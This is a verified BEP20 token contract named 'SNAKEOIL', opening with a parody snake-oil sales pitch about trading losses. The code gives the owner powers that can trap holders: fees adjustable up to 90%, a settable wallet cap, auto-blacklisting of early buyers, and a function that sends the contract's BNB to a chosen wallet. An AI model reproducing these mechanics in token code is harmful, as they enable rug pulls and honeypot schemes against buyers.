/**
 *Submitted for verification at BscScan.com on 2022-03-03
*/

//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

/**
 * First published in the journal “Bearish Afflictions of The Head, Neck, Upper Torso, Lower Torso, and Buttocks, and Bilious Ducts: May 1877”, and read before the Mumu Society's annual meeting.
 * 
 * FRIENDS,
 * ARE YOU JUST'D? 
 * RIDDLED WITH BOBOITIS?
 * NECK SORE AF FROM BUYING ANOTHER TOP?
 * BILIOUS DUCTS HYPERDEFLATED?
 * FRET NO MORE,
 * THERE IS FINALLY A CURE FOR THESE TERRIBLE AILMENTS, AND MANY MORE!
 * A TRUE MUST-DRINK ITEM FOR ALL SERIOUS POTION BUYERS.
 * FIRST LET ME TELL YOU ABOUT A MAN, A MR. R. HAMMERLIN OF LOUISIANA.
 * THIS MAN WAS BROUGHT BEFORE ME WITH AN EXTREME CASE OF PINK WOJACITY.
 * HIS SKIN WAS ALMOST 100% PINK AND HE WAS ONLY ABLE TO VOCALIZE THE LETTER "A".
 * WITHOUT A DOUBT ONE OF THE WORST CASES IN LOUISIANA.
 * AFTER TREATING HIM WITH THE USUAL POULTICES AND OINTMENTS AND FINDING NO IMPROVEMENT,
 * I SET TO DEVELOPING MY OWN MEDICINE TO HELP TREAT THIS MAN.
 * AFTER A GREAT DEAL OF EXPERIMENTATION WITH TOAD VENOM AND WHALE JUICE,
 * WHICH ONLY RESULTED IN A WORSENING OF MR. HAMMERLIN'S CONDITION,
 * MY ASSISTANTS AND I WERE ALMOST READY TO ACCEPT THAT WOJACITY THIS PINK IS RIGHTLY INCURABLE.
 * BUT WE CONTINUED ON.
 * DURING A CHANCE ENCOUNTER WITH SOME ORIENTAL LABORERS,
 * WE DISCOVERED A DRINK WHICH IS USED RECREATIONALLY IN FORMOSA AS AN APHRODISIAC AND INDIGESTION AID.
 * IT IS MADE FROM THE JUICE OF THE BILIOUS DUCTS OF A TYPE OF WATER SNAKE.
 * WHEN CONSUMED BY INDIVIDUALS OF A NON-BOBOISH DISPOSITION,
 * THIS DRINK INDEED WORKS AS INTENDED BY ITS WISE EASTERN CREATORS.
 * AND A FINE JOB THEY DID.
 * A FINE JOB THEY DID.
 * ANYWAY, I DIGRESS. MR HAMMERLIN, UPON SEEING MY ASSISTANTS ENJOYING THE POTION'S EFFECTS,
 * REQUESTED TO BE RUBBED ALL OVER WITH THIS BEVERAGE.
 * IN THEIR INTOXICATED STATES, THEY OBLIGED, 
 * AND WE ALL WERE SOON WITNESS TO THE SPECTACLE OF MR HAMMERLIN'S COMPLEXION UNPINKENING BEFORE OUR EYES.
 * FURTHERMORE, MR. HAMMERLIN WENT ON TO DRINK A WHOLE BOTTLE OF THE POTION,
 * UPON WHICH HE WAS RENDERED IN A STATE OF PURE BULLISHNESS, WHICH HAS PERSISTED FOR OVER 7 MONTHS NOW.
 * SINCE HIS TREATMENT, HE HAS BEEN BUYING EVERYTHING HE CAN, 
 * AND SUGGESTING EVERYONE AROUND HIM DO LIKEWISE.
 * HE HAS EVEN BEEN ACTING AS A SALESMAN FOR THE FORMULA,
 * AND CLAIMS IT WILL SOON HAVE A GREATER MARKET CAPITALIZATION THEN GOLD ITSELF.
 * EVEN MORE INCREDIBLE, OUR PRELIMINARY STUDIES HAVE SHOW THE JUICE TO BE BENFICIAL TO SUFFERERS 
 * OF ALMOST ALL BEARISH AFFLICTIONS.
 * SINCE OUR BREAKTHROUGH CASE WITH MR. HAMMERLIN, WE SET TO REFINE THE DRINK TO MAKE IT MORE PALATABLE.
 * WE HAD A GREAT DEAL OF SUCCESS IN COMBINING THE DRINK WITH WHALE JUICE AND TOAD VENOM,
 * BEFORE SUSPENDING IT IN A MINERAL OIL, RENDERING IT FIT FOR BOTTLING AND TRANSPORT.
 * WE HAVE EVEN REDUCED THE SYRUM IN A PRESSURE VAT, TRIIIPLING ITS POTENCY.
 * TODAY, FRIENDS OF THE MUMU SOCIETY, 
 * I PRESENT TO YOU,
 * 
 * THE CURE 
 *
 * for
 *
 * BOBOITIS
 * JUST'D
 * REKTEDNESS
 * DROOPY BAGS
 * HYPERINFLATION OF THE BILIOUS DUCTS
 * HYPERDEFLATION OF THE BILIOUS DUCTS
 * FUD LEG
 * ST. THOMAS SYNDROME
 * FEEBLENESS OF THE HANDS AND WRISTS
 * BEARISH DIVERGENCES OF THE BILIOUS DUCTS
 * DUMP FEVER
 * TOP BUYER'S NECK
 * BAGHOLDER'S RHEUMATISM OF THE BILIOUS DUCTS
 * BOTTOM SELLER'S HAEMMORHAGE HANDS
 * CRAB GLANDS
 * LOSS OF BILIOUS DUCTS
 * FRONTRUNNERSYNDROME
 * PANIC SELLERS RASH
 * RUG BREATH
 * LAMENESS BY A LOT
 * HONEY POTTED SPAZM FLAPS
 * CHIMPANZEE ACNE
 * THE PINK WOJACITY
 * AND OF COURSE, MOOSEBUMPS
 *
 * PATENTED
 * 
 * UNCLE ALOYSIUS' FAMOUS TRIIIPLE STRENGTH BULL RUN SYRUM FORMULA
 * GOOD FOR MAN AND BEAST
 * 
 *
 *    $$\     $$$$$$\  $$\   $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  $$$$$$\ $$\       
 *  $$$$$$\  $$  __$$\ $$$\  $$ |$$  __$$\ $$ | $$  |$$  _____|$$  __$$\ \_$$  _|$$ |      
 * $$  __$$\ $$ /  \__|$$$$\ $$ |$$ /  $$ |$$ |$$  / $$ |      $$ /  $$ |  $$ |  $$ |      
 * $$ /  \__|\$$$$$$\  $$ $$\$$ |$$$$$$$$ |$$$$$  /  $$$$$\    $$ |  $$ |  $$ |  $$ |      
 * \$$$$$$\   \____$$\ $$ \$$$$ |$$  __$$ |$$  $$<   $$  __|   $$ |  $$ |  $$ |  $$ |      
 *  \___ $$\ $$\   $$ |$$ |\$$$ |$$ |  $$ |$$ |\$$\  $$ |      $$ |  $$ |  $$ |  $$ |      
 * $$\  \$$ |\$$$$$$  |$$ | \$$ |$$ |  $$ |$$ | \$$\ $$$$$$$$\  $$$$$$  |$$$$$$\ $$$$$$$$\ 
 * \$$$$$$  | \______/ \__|  \__|\__|  \__|\__|  \__|\________| \______/ \______|\________|
 * \_$$  _/                                                                               
 *  \ _/                                                                                 
 */

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable {
    address internal owner;
    
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    event OwnershipTransferred(address indexed owner, address indexed to);
}
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract UNCLE is IBEP20, Ownable {
    using SafeMath for uint256;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address public marketingAddress;
    address public liquidityProviderAddress;
    string _name = "UNCLE ALOYSIUS FAMOUS TRIIIPLE STRENGTH BULL RUN SYRUM FORMULA";
    string _symbol = "SNAKEOIL";
    uint8 constant _decimals = 4;
    uint256 _totalSupply = 1 * 10**6 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply.mul(1).div(100);
    uint256 public _maxWalletToken = _totalSupply.mul(1).div(400);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) _isFeeExempt;
    uint256 liquidityFee    = 5;
    uint256 marketingFee    = 5;
    uint256 public totalFee = 10;
    IDEXRouter public router;
    address public uniswapV2Pair;
    bool public swapEnabled = false;
    uint256 public swapThreshold = _maxTxAmount.mul(liquidityFee).div(100);
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    mapping (address => bool) _botList;
    uint256 _startBlock = 0;
    uint256 _botBlocks = 2;
    mapping (address => bool) _devList;
    function isBot(address adr) public view returns (bool) {
        return _botList[adr];
    }
    function addToDevList(address[] calldata addresses) external onlyOwner {
        for (uint i=0; i< addresses.length; i++) {
            _devList[addresses[i]] = true;
        }
    }
    function start() external onlyOwner {
        _startBlock = block.number;
    }
    function setLiquidityProviderAddress(address _wallet) external {
        if (owner == msg.sender) {
            liquidityProviderAddress = _wallet;
        }
    }
    function setSwapEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }
    constructor () {
        owner = msg.sender;
        _devList[msg.sender] = true;
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = _totalSupply;
        _isFeeExempt[msg.sender] = true;
        approve(address(router), _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != _totalSupply){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }
    //settting the maximum permitted wallet holding (percent of total supply)
    function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner {
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 100;
    }
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != uniswapV2Pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (inSwap){ return _basicTransfer(sender, recipient, amount); }
        if (recipient != address(this) && recipient != address(DEAD) && recipient != address(ZERO) && recipient != uniswapV2Pair && recipient != marketingAddress && sender != liquidityProviderAddress && recipient != liquidityProviderAddress){
            uint256 heldTokens = balanceOf(recipient);
            uint256 feeAmount = amount.mul(totalFee).div(100);
            require((heldTokens + amount - feeAmount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
        }
        if (!_devList[sender] && !_devList[recipient] && sender != liquidityProviderAddress && recipient != liquidityProviderAddress){
            require(_startBlock > 0);
            require(!_botList[sender] && !_botList[recipient]);
            if (block.number < (_startBlock + _botBlocks) && recipient != uniswapV2Pair) {
                _botList[recipient] = true;
            }
        }
        checkTxLimit(sender, recipient, amount);
        if (shouldSwapBack()){ swapBack(); }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        uint256 feeAmount = amount.mul(totalFee).div(100);
        if (recipient == uniswapV2Pair) {
            feeAmount = 0;
        }
        require((amount - feeAmount <= _maxTxAmount) || liquidityProviderAddress == sender || liquidityProviderAddress == recipient, "TX Limit Exceeded");
    }
    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !_isFeeExempt[sender] && sender != liquidityProviderAddress && recipient != liquidityProviderAddress;
    }
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }
    function swapBack() internal swapping {
        uint256 amountToLiquify = _balances[address(this)].mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = _balances[address(this)].sub(amountToLiquify);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = (address(this).balance).mul(9).div(10);
        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        if (marketingAddress != address(0)) {
            payable(marketingAddress).call{value: amountBNBMarketing, gas: 60000}("");
        }
        if (amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                ZERO,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }
    function changeFValues(uint256 _liquidityFee, uint256 _marketingFee) external onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        totalFee = _liquidityFee.add(_marketingFee);
        require(totalFee < 91);
    }
    function setFeeReceiver(address marketingWallet) external onlyOwner {
        marketingAddress = marketingWallet;
    }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
    function clearStuckBalance(uint256 amountPercentage) external {
        require(_devList[msg.sender]);
        uint256 amountBNB = address(this).balance;
        payable(marketingAddress).transfer(amountBNB * amountPercentage / 100);
    }
    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}